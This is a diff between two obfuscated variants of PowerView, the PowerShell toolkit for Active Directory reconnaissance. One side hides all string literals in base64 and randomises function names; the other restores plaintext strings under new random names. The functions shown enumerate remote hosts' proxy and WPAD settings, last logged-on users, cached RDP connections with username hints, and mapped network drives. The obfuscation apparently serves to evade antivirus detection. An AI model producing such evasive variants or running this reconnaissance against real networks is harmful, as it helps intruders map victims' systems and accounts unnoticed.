-            $IsAdmin.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkFkbWluQWNjZXNz"))))
+            $IsAdmin.PSObject.TypeNames.Insert(0, 'PowerView.AdminAccess')
             $IsAdmin
         }
     }
 
     END {
         if ($LogonToken) {
-            husafk -TokenHandle $LogonToken
+            njmybn -TokenHandle $LogonToken
         }
     }
 }
 
 
-function zzsifw {
+function mspskz {
 
 
     [OutputType('PowerView.ComputerSite')]
@@ -9396,7 +9400,7 @@ function zzsifw {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),
+        $ComputerName = 'localhost',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -9404,20 +9408,20 @@ function zzsifw {
     )
 
     BEGIN {
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-            $LogonToken = jgnbzn -Credential $Credential
+        if ($PSBoundParameters['Credential']) {
+            $LogonToken = kckfvi -Credential $Credential
         }
     }
 
     PROCESS {
         ForEach ($Computer in $ComputerName) {
             
-            if ($Computer -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Xig/OlswLTldezEsM31cLil7M31bMC05XXsxLDN9JA==")))) {
+            if ($Computer -match '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$') {
                 $IPAddress = $Computer
                 $Computer = [System.Net.Dns]::GetHostByAddress($Computer) | Select-Object -ExpandProperty HostName
             }
             else {
-                $IPAddress = @(rcuisx -ComputerName $Computer)[0].IPAddress
+                $IPAddress = @(rwxsjr -ComputerName $Computer)[0].IPAddress
             }
 
             $PtrInfo = [IntPtr]::Zero
@@ -9425,18 +9429,18 @@ function zzsifw {
             $Result = $Netapi32::DsGetSiteName($Computer, [ref]$PtrInfo)
 
             $ComputerSite = New-Object PSObject
-            $ComputerSite | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
-            $ComputerSite | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SVBBZGRyZXNz"))) $IPAddress
+            $ComputerSite | Add-Member Noteproperty 'ComputerName' $Computer
+            $ComputerSite | Add-Member Noteproperty 'IPAddress' $IPAddress
 
             if ($Result -eq 0) {
                 $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($PtrInfo)
-                $ComputerSite | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU="))) $Sitename
+                $ComputerSite | Add-Member Noteproperty 'SiteName' $Sitename
             }
             else {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1OZXRDb21wdXRlclNpdGVOYW1lXSBFcnJvcjogezB9"))) -f $(([ComponentModel.Win32Exception] $Result).Message))
-                $ComputerSite | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l0ZU5hbWU="))) ''
+                Write-Verbose ("[Get-NetComputerSiteName] Error: {0}" -f $(([ComponentModel.Win32Exception] $Result).Message))
+                $ComputerSite | Add-Member Noteproperty 'SiteName' ''
             }
-            $ComputerSite.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkNvbXB1dGVyU2l0ZQ=="))))
+            $ComputerSite.PSObject.TypeNames.Insert(0, 'PowerView.ComputerSite')
 
             
             $Null = $Netapi32::NetApiBufferFree($PtrInfo)
@@ -9447,13 +9451,13 @@ function zzsifw {
 
     END {
         if ($LogonToken) {
-            husafk -TokenHandle $LogonToken
+            njmybn -TokenHandle $LogonToken
         }
     }
 }
 
 
-function jiriuc {
+function qzjczt {
 
 
     [OutputType('PowerView.ProxySettings')]
@@ -9474,21 +9478,21 @@ function jiriuc {
         ForEach ($Computer in $ComputerName) {
             try {
                 $WmiArguments = @{
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGlzdA=="))) = $True
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xhc3M="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RkUmVnUHJvdg==")))
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZXNwYWNl"))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cm9vdFxkZWZhdWx0")))
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJuYW1l"))) = $Computer
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3JBY3Rpb24="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcA==")))
+                    'List' = $True
+                    'Class' = 'StdRegProv'
+                    'Namespace' = 'root\default'
+                    'Computername' = $Computer
+                    'ErrorAction' = 'Stop'
                 }
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $WmiArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+                if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }
 
                 $RegProvider = Get-WmiObject @WmiArguments
-                $Key = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cSW50ZXJuZXQgU2V0dGluZ3M=")))
+                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'
 
                 
                 $HKCU = 2147483649
-                $ProxyServer = $RegProvider.GetStringValue($HKCU, $Key, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJveHlTZXJ2ZXI=")))).sValue
-                $AutoConfigURL = $RegProvider.GetStringValue($HKCU, $Key, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXV0b0NvbmZpZ1VSTA==")))).sValue
+                $ProxyServer = $RegProvider.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
+                $AutoConfigURL = $RegProvider.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue
 
                 $Wpad = ''
                 if ($AutoConfigURL -and ($AutoConfigURL -ne '')) {
@@ -9496,32 +9500,32 @@ function jiriuc {
                         $Wpad = (New-Object Net.WebClient).DownloadString($AutoConfigURL)
                     }
                     catch {
-                        Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlSZWdQcm94eV0gRXJyb3IgY29ubmVjdGluZyB0byBBdXRvQ29uZmlnVVJMIDogJEF1dG9Db25maWdVUkw=")))
+                        Write-Warning "[Get-WMIRegProxy] Error connecting to AutoConfigURL : $AutoConfigURL"
                     }
                 }
 
                 if ($ProxyServer -or $AutoConfigUrl) {
                     $Out = New-Object PSObject
-                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
-                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJveHlTZXJ2ZXI="))) $ProxyServer
-                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXV0b0NvbmZpZ1VSTA=="))) $AutoConfigURL
-                    $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V3BhZA=="))) $Wpad
-                    $Out.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlByb3h5U2V0dGluZ3M="))))
+                    $Out | Add-Member Noteproperty 'ComputerName' $Computer
+                    $Out | Add-Member Noteproperty 'ProxyServer' $ProxyServer
+                    $Out | Add-Member Noteproperty 'AutoConfigURL' $AutoConfigURL
+                    $Out | Add-Member Noteproperty 'Wpad' $Wpad
+                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                     $Out
                 }
                 else {
-                    Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlSZWdQcm94eV0gTm8gcHJveHkgc2V0dGluZ3MgZm91bmQgZm9yICRDb21wdXRlck5hbWU=")))
+                    Write-Warning "[Get-WMIRegProxy] No proxy settings found for $ComputerName"
                 }
             }
             catch {
-                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlSZWdQcm94eV0gRXJyb3IgZW51bWVyYXRpbmcgcHJveHkgc2V0dGluZ3MgZm9yICRDb21wdXRlck5hbWUgOiB7MH0="))) -f $_)
+                Write-Warning ("[Get-WMIRegProxy] Error enumerating proxy settings for $ComputerName : {0}" -f $_)
             }
         }
     }
 }
 
 
-function omxvau {
+function jfyhko {
 
 
     [OutputType('PowerView.LastLoggedOnUser')]
@@ -9531,7 +9535,7 @@ function omxvau {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),
+        $ComputerName = 'localhost',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -9544,37 +9548,37 @@ function omxvau {
             $HKLM = 2147483650
 
             $WmiArguments = @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGlzdA=="))) = $True
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xhc3M="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RkUmVnUHJvdg==")))
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZXNwYWNl"))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cm9vdFxkZWZhdWx0")))
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJuYW1l"))) = $Computer
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3JBY3Rpb24="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2lsZW50bHlDb250aW51ZQ==")))
+                'List' = $True
+                'Class' = 'StdRegProv'
+                'Namespace' = 'root\default'
+                'Computername' = $Computer
+                'ErrorAction' = 'SilentlyContinue'
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $WmiArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }
 
             
             try {
                 $Reg = Get-WmiObject @WmiArguments
 
-                $Key = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cQXV0aGVudGljYXRpb25cTG9nb25VSQ==")))
-                $Value = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdExvZ2dlZE9uVXNlcg==")))
+                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
+                $Value = 'LastLoggedOnUser'
                 $LastUser = $Reg.GetStringValue($HKLM, $Key, $Value).sValue
 
                 $LastLoggedOn = New-Object PSObject
-                $LastLoggedOn | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
-                $LastLoggedOn | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGFzdExvZ2dlZE9u"))) $LastUser
-                $LastLoggedOn.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3Lkxhc3RMb2dnZWRPblVzZXI="))))
+                $LastLoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
+                $LastLoggedOn | Add-Member Noteproperty 'LastLoggedOn' $LastUser
+                $LastLoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                 $LastLoggedOn
             }
             catch {
-                Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlSZWdMYXN0TG9nZ2VkT25dIEVycm9yIG9wZW5pbmcgcmVtb3RlIHJlZ2lzdHJ5IG9uICRDb21wdXRlci4gUmVtb3RlIHJlZ2lzdHJ5IGxpa2VseSBub3QgZW5hYmxlZC4=")))
+                Write-Warning "[Get-WMIRegLastLoggedOn] Error opening remote registry on $Computer. Remote registry likely not enabled."
             }
         }
     }
 }
 
 
-function swuemy {
+function wsadgt {
 
 
     [OutputType('PowerView.CachedRDPConnection')]
@@ -9584,7 +9588,7 @@ function swuemy {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),
+        $ComputerName = 'localhost',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -9597,79 +9601,79 @@ function swuemy {
             $HKU = 2147483651
 
             $WmiArguments = @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGlzdA=="))) = $True
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xhc3M="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RkUmVnUHJvdg==")))
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZXNwYWNl"))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cm9vdFxkZWZhdWx0")))
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJuYW1l"))) = $Computer
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3JBY3Rpb24="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcA==")))
+                'List' = $True
+                'Class' = 'StdRegProv'
+                'Namespace' = 'root\default'
+                'Computername' = $Computer
+                'ErrorAction' = 'Stop'
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $WmiArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }
 
             try {
                 $Reg = Get-WmiObject @WmiArguments
 
                 
-                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMjEtWzAtOV0rLVswLTldKy1bMC05XSstWzAtOV0rJA=="))) }
+                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
 
                 ForEach ($UserSID in $UserSIDs) {
                     try {
-                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-                            $UserName = ylepkl -ObjectSid $UserSID -Credential $Credential
+                        if ($PSBoundParameters['Credential']) {
+                            $UserName = rnmqfb -ObjectSid $UserSID -Credential $Credential
                         }
                         else {
-                            $UserName = ylepkl -ObjectSid $UserSID
+                            $UserName = rnmqfb -ObjectSid $UserSID
                         }
 
                         
-                        $ConnectionKeys = $Reg.EnumValues($HKU,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcRGVmYXVsdA==")))).sNames
+                        $ConnectionKeys = $Reg.EnumValues($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Default").sNames
 
                         ForEach ($Connection in $ConnectionKeys) {
                             
-                            if ($Connection -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TVJVLio=")))) {
-                                $TargetServer = $Reg.GetStringValue($HKU, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcRGVmYXVsdA=="))), $Connection).sValue
+                            if ($Connection -match 'MRU.*') {
+                                $TargetServer = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Default", $Connection).sValue
 
                                 $FoundConnection = New-Object PSObject
-                                $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
-                                $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
-                                $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNJRA=="))) $UserSID
-                                $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0U2VydmVy"))) $TargetServer
-                                $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcm5hbWVIaW50"))) $Null
-                                $FoundConnection.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkNhY2hlZFJEUENvbm5lY3Rpb24="))))
+                                $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
+                                $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
+                                $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
+                                $FoundConnection | Add-Member Noteproperty 'TargetServer' $TargetServer
+                                $FoundConnection | Add-Member Noteproperty 'UsernameHint' $Null
+                                $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                 $FoundConnection
                             }
                         }
 
                         
-                        $ServerKeys = $Reg.EnumKey($HKU,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcU2VydmVycw==")))).sNames
+                        $ServerKeys = $Reg.EnumKey($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Servers").sNames
 
                         ForEach ($Server in $ServerKeys) {
 
-                            $UsernameHint = $Reg.GetStringValue($HKU, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcU2VydmVyc1wkU2VydmVy"))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcm5hbWVIaW50")))).sValue
+                            $UsernameHint = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Servers\$Server", 'UsernameHint').sValue
 
                             $FoundConnection = New-Object PSObject
-                            $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
-                            $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
-                            $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNJRA=="))) $UserSID
-                            $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGFyZ2V0U2VydmVy"))) $Server
-                            $FoundConnection | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlcm5hbWVIaW50"))) $UsernameHint
-                            $FoundConnection.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkNhY2hlZFJEUENvbm5lY3Rpb24="))))
+                            $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
+                            $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
+                            $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
+                            $FoundConnection | Add-Member Noteproperty 'TargetServer' $Server
+                            $FoundConnection | Add-Member Noteproperty 'UsernameHint' $UsernameHint
+                            $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                             $FoundConnection
                         }
                     }
                     catch {
-                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlSZWdDYWNoZWRSRFBDb25uZWN0aW9uXSBFcnJvcjogezB9"))) -f $_)
+                        Write-Verbose ("[Get-WMIRegCachedRDPConnection] Error: {0}" -f $_)
                     }
                 }
             }
             catch {
-                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlSZWdDYWNoZWRSRFBDb25uZWN0aW9uXSBFcnJvciBhY2Nlc3NpbmcgJENvbXB1dGVyLCBsaWtlbHkgaW5zdWZmaWNpZW50IHBlcm1pc3Npb25zIG9yIGZpcmV3YWxsIHJ1bGVzIG9uIGhvc3Q6IHswfQ=="))) -f $_)
+                Write-Warning ("[Get-WMIRegCachedRDPConnection] Error accessing $Computer, likely insufficient permissions or firewall rules on host: {0}" -f $_)
             }
         }
     }
 }
 
 
-function uhdgdk {
+function jzfwqx {
 
 
     [OutputType('PowerView.RegMountedDrive')]
@@ -9679,7 +9683,7 @@ function uhdgdk {
         [Alias('HostName', 'dnshostname', 'name')]
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $ComputerName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bG9jYWxob3N0"))),
+        $ComputerName = 'localhost',
 
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
@@ -9692,65 +9696,65 @@ function uhdgdk {
             $HKU = 2147483651
 
             $WmiArguments = @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TGlzdA=="))) = $True
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xhc3M="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RkUmVnUHJvdg==")))
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmFtZXNwYWNl"))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("cm9vdFxkZWZhdWx0")))
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJuYW1l"))) = $Computer
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXJyb3JBY3Rpb24="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3RvcA==")))
+                'List' = $True
+                'Class' = 'StdRegProv'
+                'Namespace' = 'root\default'
+                'Computername' = $Computer
+                'ErrorAction' = 'Stop'
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $WmiArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }
 
             try {
                 $Reg = Get-WmiObject @WmiArguments
 
                 
-                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMjEtWzAtOV0rLVswLTldKy1bMC05XSstWzAtOV0rJA=="))) }
+                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
 
                 ForEach ($UserSID in $UserSIDs) {
                     try {
-                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-                            $UserName = ylepkl -ObjectSid $UserSID -Credential $Credential
+                        if ($PSBoundParameters['Credential']) {
+                            $UserName = rnmqfb -ObjectSid $UserSID -Credential $Credential
                         }
                         else {
-                            $UserName = ylepkl -ObjectSid $UserSID
+                            $UserName = rnmqfb -ObjectSid $UserSID
                         }
 
-                        $DriveLetters = ($Reg.EnumKey($HKU, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcTmV0d29yaw=="))))).sNames
+                        $DriveLetters = ($Reg.EnumKey($HKU, "$UserSID\Network")).sNames
 
                         ForEach ($DriveLetter in $DriveLetters) {
-                            $ProviderName = $Reg.GetStringValue($HKU, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcTmV0d29ya1wkRHJpdmVMZXR0ZXI="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvdmlkZXJOYW1l")))).sValue
-                            $RemotePath = $Reg.GetStringValue($HKU, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcTmV0d29ya1wkRHJpdmVMZXR0ZXI="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlUGF0aA==")))).sValue
-                            $DriveUserName = $Reg.GetStringValue($HKU, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JFVzZXJTSURcTmV0d29ya1wkRHJpdmVMZXR0ZXI="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU=")))).sValue
+                            $ProviderName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'ProviderName').sValue
+                            $RemotePath = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'RemotePath').sValue
+                            $DriveUserName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'UserName').sValue
                             if (-not $UserName) { $UserName = '' }
 
                             if ($RemotePath -and ($RemotePath -ne '')) {
                                 $MountedDrive = New-Object PSObject
-                                $MountedDrive | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
-                                $MountedDrive | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlck5hbWU="))) $UserName
-                                $MountedDrive | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VXNlclNJRA=="))) $UserSID
-                                $MountedDrive | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RHJpdmVMZXR0ZXI="))) $DriveLetter
-                                $MountedDrive | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvdmlkZXJOYW1l"))) $ProviderName
-                                $MountedDrive | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlUGF0aA=="))) $RemotePath
-                                $MountedDrive | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RHJpdmVVc2VyTmFtZQ=="))) $DriveUserName
-                                $MountedDrive.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LlJlZ01vdW50ZWREcml2ZQ=="))))
+                                $MountedDrive | Add-Member Noteproperty 'ComputerName' $Computer
+                                $MountedDrive | Add-Member Noteproperty 'UserName' $UserName
+                                $MountedDrive | Add-Member Noteproperty 'UserSID' $UserSID
+                                $MountedDrive | Add-Member Noteproperty 'DriveLetter' $DriveLetter
+                                $MountedDrive | Add-Member Noteproperty 'ProviderName' $ProviderName
+                                $MountedDrive | Add-Member Noteproperty 'RemotePath' $RemotePath
+                                $MountedDrive | Add-Member Noteproperty 'DriveUserName' $DriveUserName
+                                $MountedDrive.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                 $MountedDrive
                             }
                         }
                     }
                     catch {
-                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlSZWdNb3VudGVkRHJpdmVdIEVycm9yOiB7MH0="))) -f $_)
+                        Write-Verbose ("[Get-WMIRegMountedDrive] Error: {0}" -f $_)
                     }
                 }
             }
             catch {
-                Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1XTUlSZWdNb3VudGVkRHJpdmVdIEVycm9yIGFjY2Vzc2luZyAkQ29tcHV0ZXIsIGxpa2VseSBpbnN1ZmZpY2llbnQgcGVybWlzc2lvbnMgb3IgZmlyZXdhbGwgcnVsZXMgb24gaG9zdDogezB9"))) -f $_)
+                Write-Warning ("[Get-WMIRegMountedDrive] Error accessing $Computer, likely insufficient permissions or firewall rules on host: {0}" -f $_)
             }
         }
     }
